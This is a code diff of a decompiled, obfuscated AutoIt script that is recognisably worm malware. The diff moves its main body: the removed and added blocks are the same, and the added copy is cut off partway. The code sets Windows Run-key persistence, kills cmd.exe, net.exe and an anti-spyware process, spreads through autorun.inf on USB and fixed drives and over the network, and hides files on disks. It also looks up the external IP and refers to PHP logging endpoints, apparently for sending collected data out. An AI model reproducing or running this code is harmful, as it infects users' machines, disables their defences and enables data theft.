@@ -1272,616 +1272,6 @@ Func Fn009B($Arg00, $ArgOpt01 = True)
 	Return SetError($Local0027, $Var028B, $Local0026)
 EndFunc
 
-AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
-$Var028C = "cftuon.exe"
-$Var028D = "cftuon"
-$Var028E = "cftu.exe"
-$Var028F = "cftu"
-If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
-	Run(@ComSpec & " /c " & "explorer " & @ScriptDir, "", @SW_HIDE)
-	If @error Then
-	EndIf
-	Sleep(0x0BB8)
-	If Fn008F("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
-		Exit
-	EndIf
-EndIf
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
-	If Fn008F("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
-		Exit
-	EndIf
-EndIf
-If FileExists("95a1sd.xx") Then
-	$Var0290 = FileRead("95a1sd.xx")
-	If @AutoItExe = $Var0290 Then
-		FileWrite("vvfd", "")
-		Exit
-	EndIf
-EndIf
-$Var0291 = "alokium.exe"
-$Var0292 = "csrcs.exe"
-$Var0293 = "autorun.inf"
-$Var0294 = "autorun.i"
-$Var0295 = "autorun.in"
-$Var0296 = "csrcs"
-$Var0297 = "khy"
-$Var0298 = "csrcs.au3"
-$Var0299 = "NTrun.au3"
-$Var029A = "HKLM\Software\Microsoft\DRM\amty"
-$Var029B = "-1"
-$Var029C = 0
-$Var029D = 0
-$Var029E = 0
-$Var029F = ""
-$Var02A0 = ""
-$Var02A1 = ""
-$Var02A2 = "kiu"
-$Var02A3 = "View files"
-$Var02A4 = ""
-$Var02A5 = "-"
-$Var02A6 = "-"
-$Var02A7 = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
-$Var02A8 = $Var02A7
-$Var02A9 = $Var02A7
-$Var02AA = 0
-$Var02AB = 0
-$Var02AC = 0
-Global $Var02AD
-Global $Var02AE
-Global $Var02AF
-$Var02B0 = 0
-$Var02B1 = 0x007F
-$Var02B2 = 0
-$Var02B3 = 0
-$Var02B4 = 1
-$Var02B5 = 0
-$Var02B6 = 0
-$Var02B7 = 0
-$Var02B8 = 0
-$Var02B9 = 0
-$Var02BA = "_PE04E6B7463C3BD27"
-$Var02BB = ""
-$Var02BC = ""
-$Var02BD = ""
-$Var02BE = ""
-$Var02BF = ""
-$Var02C0 = ""
-$Var02C1 = ""
-$Var02C2 = ""
-$Var02C3 = 1
-$Var02C4 = ""
-$Var02C5 = 0
-$Var02C6 = "none"
-$Var02C7 = "none"
-$Var02C8 = "none"
-$Var02C9 = "none"
-$Var02CA = "none"
-$Var02CB = "none"
-$Var02CC = "none"
-$Var02CD = "none"
-$Var02CE = 0
-$Var02CF = 0
-$Var02D0 = 0
-$Var02D1 = 0
-$Var02D2 = 0
-$Var02D3 = ""
-$Var02D4 = ""
-$Var02D5 = ""
-$Var02D6 = ""
-$Var02D7 = 0
-$Var02D8 = 1
-$Var02D9 = 1
-$Var02DA = 0
-Global $Var02DB
-Global $Var02DC
-Global $Var02DD
-Global $Var02DE
-Global $Var02DF
-Global $Var02E0
-Global $Var02E1
-Global $Var02E2
-Global $Var02E3
-Global $Var02E4
-Global $Var02E5
-Global $Var02E6
-Global $Var02E7
-Global $Var02D5
-Global $Var02D6
-Global $Var02D3
-Global $Var02D4
-Global $Var02E8
-Global $Var02E9
-Global $Var02EA
-Global $Var02EB
-Global $Var02EC
-Global $Var02ED
-Global $Var02EE
-Global $Var029E
-Global $Var02EF
-Global $Var02F0
-Global $Var02F1
-Global $Var02F2
-Global $Var02B0
-Global $Var02F3
-Global $Var02F4
-Global $Var02F5
-Global $Var02F6
-Global $Var02F7
-Global $Var02F8
-Global $Var02F9
-Global $Var02FA
-Global $Var02FB
-Global $Var02FC
-Global $Var02FD
-Global $Var02FE
-Global $Var02FF
-Global $Var0300
-Global $Var0301, $Var0302
-Global $Var0303, $Var0304, $Var0305, $Local002B, $Var0306, $Var0307, $Var0308, $Var0309, $Var030A, $Var030B, $Var030C, $Var030D, $Var030E
-Global $Var030F, $Var0310
-Global $Var0311 = "RegShellSM.exe"
-Global $Var0312, $Var0313, $Var0314, $Var0315
-$Var0316 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x0001869F, 1) & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC
-$Var0317 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x270F, 1)
-$Var0318 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & ".da"
-Global $Var0319 = @HomeDrive & "\" & $Var0316 & "\" & $Var0317 & "\"
-Global $Var031A = $Var0319 & $Var0318, $Var031B
-Global $Var031C
-$Var031D = ""
-$Var031E = ""
-$Var031F = ""
-$Var0320 = ""
-$Var0308 = ""
-$Var0321 = ""
-$Var0322 = ""
-$Var0323 = ""
-$Var0324 = ""
-$Var0325 = ""
-$Var0326 = ""
-$Var0327 = "a_log.php"
-$Var0328 = "f_log.php"
-$Var0329 = "e_log.php"
-$Var032A = "k_log.php"
-$Var032B = "l_log.php"
-$Var032C = "s_log.php"
-$Var032D = "d_log.php"
-$Var0302 = ""
-$Var032E = ""
-$Var02DD = 0
-$Var02DE = 0
-$Var02EB = 0
-$Var02E1 = 0
-$EncryptionKey = ""
-$Var0330 = ""
-$Var0331 = ""
-$Var0332 = ""
-$Var0333 = ""
-$Var0334 = ""
-$Var0335 = ""
-$Var0336 = ""
-$Var0337 = ""
-$Var0338 = ""
-$Var0339 = ""
-$Var033A = ""
-$Var033B = ""
-$Var033C = ""
-$Var033D = ""
-$Var033E = ""
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028E Then
-	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F, "REG_SZ", @SystemDir & "\" & $Var028E)
-	If ProcessExists($Var0292) Then
-		ProcessClose($Var0292)
-		Sleep(0x01F4)
-		If ProcessExists($Var0292) Then
-			ProcessWaitClose($Var0292, 0x003C)
-		EndIf
-	EndIf
-	If ProcessExists("cmd.exe") Then
-		ProcessClose("cmd.exe")
-		Sleep(0x01F4)
-		If ProcessExists("cmd.exe") Then
-			ProcessWaitClose("cmd.exe", 0x003C)
-		EndIf
-	EndIf
-	If ProcessExists("net.exe") Then
-		ProcessClose("net.exe")
-		Sleep(0x01F4)
-		If ProcessExists("net.exe") Then
-			ProcessWaitClose("net.exe", 0x003C)
-		EndIf
-	EndIf
-	Fn00A4()
-	Fn00A2()
-	$Var02A7 = $Var028E
-	Fn00AA()
-	Sleep(10 * 0x03E8)
-	Sleep(10 * 0x003C * 0x03E8)
-	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $Var028E) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
-			If RegRead($Var029A, "exp1") <> "" Then
-				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028F)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028F)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028F)
-				Fn00A3()
-			EndIf
-		EndIf
-	EndIf
-	Exit
-EndIf
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
-	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
-	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
-			If RegRead($Var029A, "exp1") <> "" Then
-				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
-				Fn00A3()
-			EndIf
-		EndIf
-	EndIf
-	If ProcessExists($Var0292) Then
-		ProcessClose($Var0292)
-		Sleep(0x01F4)
-		If ProcessExists($Var0292) Then
-			ProcessWaitClose($Var0292, 0x003C)
-		EndIf
-	EndIf
-	If ProcessExists("cmd.exe") Then
-		ProcessClose("cmd.exe")
-		Sleep(0x01F4)
-		If ProcessExists("cmd.exe") Then
-			ProcessWaitClose("cmd.exe", 0x003C)
-		EndIf
-	EndIf
-	If ProcessExists("net.exe") Then
-		ProcessClose("net.exe")
-		Sleep(0x01F4)
-		If ProcessExists("net.exe") Then
-			ProcessWaitClose("net.exe", 0x003C)
-		EndIf
-	EndIf
-	Fn00A4()
-	Fn00A2()
-	$Var02A7 = $Var028C
-	Fn00A9()
-	Sleep(10 * 0x03E8)
-	Sleep(10 * 0x003C * 0x03E8)
-	If ProcessExists($Var0292) Then
-		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
-			If RegRead($Var029A, "exp1") <> "" Then
-				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
-				Fn00A3()
-			EndIf
-		EndIf
-	EndIf
-	Exit
-EndIf
-If @ScriptDir = @SystemDir Then
-EndIf
-If @ScriptDir = @SystemDir Then
-	If Fn008F("df8g1sdf68g18er1g8re16", 1) = 0 Then
-		Exit
-	EndIf
-	Fn00EB()
-	$Var033F = $Var0297 & "!" & $Var02A7
-	$Var033F = Decrypt(1, $Var033F, $EncryptionKey, 1)
-	$Var02A8 = $Var02A7
-EndIf
-If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
-	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
-	$Var0341 = FileGetVersion(@AutoItExe)
-	If ProcessExists($Var0292) Then
-		If $Var0341 > $Var0340 Then
-			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-			$Var02A7 = StringMid(@AutoItExe, $Var0342)
-			Fn00A9()
-			Sleep(0x03E8)
-		EndIf
-	Else
-		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-		$Var02A7 = StringMid(@AutoItExe, $Var0342)
-		Fn00A9()
-		Sleep(0x03E8)
-	EndIf
-	If DriveGetType(@ScriptDir) = "FIXED" Then
-		Fn00A4()
-		Fn00A3()
-		Exit
-	EndIf
-ElseIf @ScriptDir = @SystemDir Then
-	Sleep(2 * 0x003C * 0x03E8)
-	If @ScriptFullPath = (@SystemDir & "\" & $Var0292) Or @ScriptFullPath = (@SystemDir & "\" & $Var0298) Then
-	Else
-		Fn00A3()
-	EndIf
-	If FileExists(@ScriptDir & "\" & $Var0295) And FileExists(@ScriptDir & "\" & $Var0294) Then
-		$Var0343 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
-		$Var0344 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
-		If $Var0343 <> $Var0344 Then
-			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
-			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
-		EndIf
-	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
-	EndIf
-	If FileExists(@ScriptDir & "\" & $Var0295) Then
-		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
-		$Var0345 = StringTrimLeft($Var0345, 1)
-		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
-		$Var0345 = StringSplit($Var0345, "!")
-		For $Var0346 = 1 To $Var0345[0]
-			If $Var0345[0] = 2 Then
-				If $Var0345[1] = $Var0297 Then
-					$Var02A8 = $Var0345[2]
-					$Var02A7 = $Var0345[2]
-				Else
-					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
-				EndIf
-			Else
-				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
-			EndIf
-		Next
-	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
-	EndIf
-	If FileExists(@ScriptDir & "\" & $Var0294) Then
-		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
-		$Var0345 = StringTrimLeft($Var0345, 1)
-		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
-		$Var0345 = StringSplit($Var0345, "!")
-		For $Var0346 = 1 To $Var0345[0]
-			If $Var0345[0] = 2 Then
-				If $Var0345[1] = $Var0297 Then
-					$Var02A8 = $Var0345[2]
-					$Var02A7 = $Var0345[2]
-				Else
-					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
-				EndIf
-			Else
-				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
-			EndIf
-		Next
-	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
-	EndIf
-Else
-	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
-	$Var0341 = FileGetVersion(@AutoItExe)
-	If ProcessExists($Var0292) Then
-		If $Var0341 > $Var0340 Then
-			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-			$Var02A7 = StringMid(@AutoItExe, $Var0342)
-			Fn00A9()
-			Sleep(0x03E8)
-		EndIf
-	Else
-		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-		$Var02A7 = StringMid(@AutoItExe, $Var0342)
-		Fn00A9()
-		Sleep(0x03E8)
-	EndIf
-	Exit
-EndIf
-If @ScriptDir = @SystemDir Then
-	If RegRead($Var029A, "a") = "1" Then
-		$Var02D1 = 1
-	EndIf
-	If RegRead($Var029A, "b") = "1" Then
-		$Var02D2 = 1
-	EndIf
-	If RegRead($Var029A, "a") = "0" Then
-		$Var02D1 = 0
-	EndIf
-	If RegRead($Var029A, "b") = "0" Then
-		$Var02D2 = 0
-	EndIf
-	If RegRead($Var029A, "eggol") = "1" Then
-		$Var02C5 = 1
-	EndIf
-	If RegRead($Var029A, "eggol") = "0" Then
-		$Var02C5 = 0
-	EndIf
-	If RegRead($Var029A, "exp1") <> "" Then
-	Else
-		RegWrite($Var029A, "exp1", "REG_SZ", Decrypt(1, @YDAY * 1, $EncryptionKey, 4))
-		RegWrite($Var029A, "dreg", "REG_SZ", Decrypt(1, @YEAR * 1, $EncryptionKey, 4))
-		RegWrite($Var029A, "fir", "REG_SZ", "x")
-	EndIf
-	$Var0347 = "http://www.whatismyip.com/automation/n09230945.asp"
-	$Var0348 = $Var0347
-	$Var0349 = $Var0347
-	$Var034A = Fn00B1()
-	If $Var034A = @IPAddress1 Then
-		$Var02B9 = 1
-	EndIf
-	$Var034B = StringSplit($Var034A, ".")
-	If $Var034B[0] = 4 Then
-		$Var02B1 = $Var034B[1]
-		$Var02B2 = $Var034B[2]
-		$Var02B3 = $Var034B[3]
-		$Var02B4 = 0
-	Else
-		$Var02B1 = 0x007F
-		$Var02B2 = 0
-		$Var02B3 = 0
-		$Var02B4 = 1
-	EndIf
-	$Var034C = @IPAddress1
-	If $Var034C = "127.0.0.1" Then
-		$Var034C = @IPAddress1
-		$Var034D = StringSplit($Var034C, ".")
-		If $Var034D[0] = 4 Then
-			$Var02B5 = $Var034D[1]
-			$Var02B6 = $Var034D[2]
-			$Var02B7 = $Var034D[3]
-			$Var02B8 = 0
-		EndIf
-	Else
-		$Var034D = StringSplit($Var034C, ".")
-		If $Var034D[0] = 4 Then
-			$Var02B5 = $Var034D[1]
-			$Var02B6 = $Var034D[2]
-			$Var02B7 = $Var034D[3]
-			$Var02B8 = 0
-		EndIf
-	EndIf
-	Fn00B4()
-	Fn00A0()
-	Fn009C()
-	If $Var02D7 = 1 And RegRead($Var029A, "rem1") = "1" Then
-		$Var02CA = "usbspread"
-		$Var02C8 = "Usb2System"
-		$Var02CB = RegRead($Var029A, "rem")
-		$Var034E = $Var0337
-		$Var02CC = "none"
-		Fn00A6()
-		RegDelete($Var029A, "rem1")
-	EndIf
-	If $Var02D7 = 1 And RegRead($Var029A, "fix1") = "1" Then
-		$Var02CA = "IPspreader"
-		$Var02C8 = "Drive2System"
-		$Var02CB = RegRead($Var029A, "fix")
-		$Var034E = $Var0338
-		$Var02CC = "none"
-		Fn00A6()
-		RegDelete($Var029A, "fix1")
-	EndIf
-	$Var034F = DriveGetDrive("FIXED")
-	If Not @error Then
-		For $Var0350 = 1 To $Var034F[0]
-			If DriveStatus($Var034F[$Var0350]) = "READY" Then
-				FileWrite($Var034F[$Var0350] & "\" & $Var0297, "")
-				FileSetAttrib($Var034F[$Var0350] & "\" & $Var0297, "+RASH")
-			EndIf
-		Next
-	EndIf
-	If RegRead($Var029A, "regexp") = Cos(@YDAY * 1) Then
-	Else
-		RegWrite($Var029A, "regexp", "REG_SZ", Cos(@YDAY * 1))
-		$Var034E = $Var0330
-		$Var02CA = @OSVersion
-		$Var02C8 = "Online"
-		$Var02CB = "none"
-		$Var02CC = "none"
-		Fn00A6()
-	EndIf
-EndIf
-Fn00B4()
-If @ScriptDir = @SystemDir Then
-	$Var0351 = @HOUR * 1
-	$Var0352 = @HOUR * 1
-	$Var0353 = @HOUR * 1
-	$Var0354 = @MIN * 1
-	$Var0355 = @HOUR * 1
-	$Var0356 = @HOUR * 1
-	$Var0357 = 0
-	$Var02AE = TimerInit()
-	$Var0358 = TimerInit()
-	$Var0359 = TimerInit()
-	$Var035A = Random(6, 8, 1)
-	$Var035B = 0
-	While 1
-		Sleep(10)
-		If $Var02D7 = 0 Then
-			If $Var0353 <> @HOUR * 1 Then
-				$Var0353 = @HOUR * 1
-				$Var035B = 0
-				Fn009C()
-				Fn00A0()
-			EndIf
-		EndIf
-		If $Var02D1 = 1 Then
-			Sleep(10)
-		EndIf
-		If $Var02D2 = 1 Then
-			Sleep(0x03E8)
-		EndIf
-		Sleep(5)
-		If $Var02D1 = 0 Then
-			If $Var02D0 = 1 Then
-				If $Var0352 <> @HOUR * 1 Then
-					$Var02D0 = 0
-				EndIf
-			EndIf
-			If $Var02D0 = 0 Then
-				$Var035C = Round(TimerDiff($Var0358), 0) / 0x03E8
-				If $Var035C > 10 Then
-					$Var035C = 0
-					$Var0358 = 0
-					$Var0358 = TimerInit()
-					Fn009E()
-				EndIf
-			EndIf
-		EndIf
-		If @HOUR * 1 <> $Var0355 And @MIN * 1 = $Var0354 Then
-			$Var0355 = @HOUR * 1
-			$Var035B = $Var035B + 1
-			If $Var035B = $Var035A Then
-				$Var035B = 0
-				$Var035A = Random(10, 0x0014, 1)
-				Fn009C()
-				Fn00A0()
-			EndIf
-		EndIf
-		Sleep(5)
-		If $Var02CF = 1 Then
-			If $Var0351 <> @HOUR * 1 Then
-				$Var0351 = @HOUR * 1
-				$Var035D = 0x0190
-				$Var02CF = 0
-			EndIf
-		Else
-			If @IPAddress1 = "127.0.0.1" Then
-			Else
-				If $Var02D2 = 0 Then
-					If $Var02B1 = 0x007F And $Var02B2 = 0 And $Var02B3 = 0 And $Var02B4 = 1 Then
-						Sleep(0x0064)
-					Else
-						Fn00AB()
-					EndIf
-					If $Var02D8 = 1 Then
-						Fn00AD()
-					EndIf
-					If $Var02D8 = 2 Then
-						Fn00AD()
-						If $Var02B8 = 0x00FF Then
-							$Var02B8 = 0
-							$Var02D8 = 0
-						EndIf
-					EndIf
-				EndIf
-			EndIf
-		EndIf
-		$Var02AF = Round(TimerDiff($Var02AE), 0) / 0x03E8
-		If $Var02AF > 0x0258 Then
-			$Var02AF = 0
-			$Var02AE = 0
-			$Var02AE = TimerInit()
-			Fn00B4()
-		EndIf
-		$Var035E = Round(TimerDiff($Var0359), 0) / 0x03E8
-		If $Var035E > 0x003C Then
-			$Var035E = 0
-			$Var0359 = 0
-			$Var0359 = TimerInit()
-			Fn009F()
-		EndIf
-	WEnd
-EndIf
-
 Func Fn009C()
 	Fn00B4()
 	Sleep(0x0064)
@@ -5970,3 +5360,613 @@ Func Fn00ED()
 	$Var033E = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EFC73D32443F9FD714317848D5133231ABBED7B1DA974FD8100BCE2C3E502C8EC3FAE8D5B7E327E509", $EncryptionKey, 2)
 	ConsoleWrite($Var033E & @CRLF)
 EndFunc
+
+AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
+$Var028C = "cftuon.exe"
+$Var028D = "cftuon"
+$Var028E = "cftu.exe"
+$Var028F = "cftu"
+If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
+	Run(@ComSpec & " /c " & "explorer " & @ScriptDir, "", @SW_HIDE)
+	If @error Then
+	EndIf
+	Sleep(0x0BB8)
+	If Fn008F("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
+		Exit
+	EndIf
+EndIf
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
+	If Fn008F("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
+		Exit
+	EndIf
+EndIf
+If FileExists("95a1sd.xx") Then
+	$Var0290 = FileRead("95a1sd.xx")
+	If @AutoItExe = $Var0290 Then
+		FileWrite("vvfd", "")
+		Exit
+	EndIf
+EndIf
+$Var0291 = "alokium.exe"
+$Var0292 = "csrcs.exe"
+$Var0293 = "autorun.inf"
+$Var0294 = "autorun.i"
+$Var0295 = "autorun.in"
+$Var0296 = "csrcs"
+$Var0297 = "khy"
+$Var0298 = "csrcs.au3"
+$Var0299 = "NTrun.au3"
+$Var029A = "HKLM\Software\Microsoft\DRM\amty"
+$Var029B = "-1"
+$Var029C = 0
+$Var029D = 0
+$Var029E = 0
+$Var029F = ""
+$Var02A0 = ""
+$Var02A1 = ""
+$Var02A2 = "kiu"
+$Var02A3 = "View files"
+$Var02A4 = ""
+$Var02A5 = "-"
+$Var02A6 = "-"
+$Var02A7 = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
+$Var02A8 = $Var02A7
+$Var02A9 = $Var02A7
+$Var02AA = 0
+$Var02AB = 0
+$Var02AC = 0
+Global $Var02AD
+Global $Var02AE
+Global $Var02AF
+$Var02B0 = 0
+$Var02B1 = 0x007F
+$Var02B2 = 0
+$Var02B3 = 0
+$Var02B4 = 1
+$Var02B5 = 0
+$Var02B6 = 0
+$Var02B7 = 0
+$Var02B8 = 0
+$Var02B9 = 0
+$Var02BA = "_PE04E6B7463C3BD27"
+$Var02BB = ""
+$Var02BC = ""
+$Var02BD = ""
+$Var02BE = ""
+$Var02BF = ""
+$Var02C0 = ""
+$Var02C1 = ""
+$Var02C2 = ""
+$Var02C3 = 1
+$Var02C4 = ""
+$Var02C5 = 0
+$Var02C6 = "none"
+$Var02C7 = "none"
+$Var02C8 = "none"
+$Var02C9 = "none"
+$Var02CA = "none"
+$Var02CB = "none"
+$Var02CC = "none"
+$Var02CD = "none"
+$Var02CE = 0
+$Var02CF = 0
+$Var02D0 = 0
+$Var02D1 = 0
+$Var02D2 = 0
+$Var02D3 = ""
+$Var02D4 = ""
+$Var02D5 = ""
+$Var02D6 = ""
+$Var02D7 = 0
+$Var02D8 = 1
+$Var02D9 = 1
+$Var02DA = 0
+Global $Var02DB
+Global $Var02DC
+Global $Var02DD
+Global $Var02DE
+Global $Var02DF
+Global $Var02E0
+Global $Var02E1
+Global $Var02E2
+Global $Var02E3
+Global $Var02E4
+Global $Var02E5
+Global $Var02E6
+Global $Var02E7
+Global $Var02D5
+Global $Var02D6
+Global $Var02D3
+Global $Var02D4
+Global $Var02E8
+Global $Var02E9
+Global $Var02EA
+Global $Var02EB
+Global $Var02EC
+Global $Var02ED
+Global $Var02EE
+Global $Var029E
+Global $Var02EF
+Global $Var02F0
+Global $Var02F1
+Global $Var02F2
+Global $Var02B0
+Global $Var02F3
+Global $Var02F4
+Global $Var02F5
+Global $Var02F6
+Global $Var02F7
+Global $Var02F8
+Global $Var02F9
+Global $Var02FA
+Global $Var02FB
+Global $Var02FC
+Global $Var02FD
+Global $Var02FE
+Global $Var02FF
+Global $Var0300
+Global $Var0301, $Var0302
+Global $Var0303, $Var0304, $Var0305, $Local002B, $Var0306, $Var0307, $Var0308, $Var0309, $Var030A, $Var030B, $Var030C, $Var030D, $Var030E
+Global $Var030F, $Var0310
+Global $Var0311 = "RegShellSM.exe"
+Global $Var0312, $Var0313, $Var0314, $Var0315
+$Var0316 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x0001869F, 1) & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC
+$Var0317 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x270F, 1)
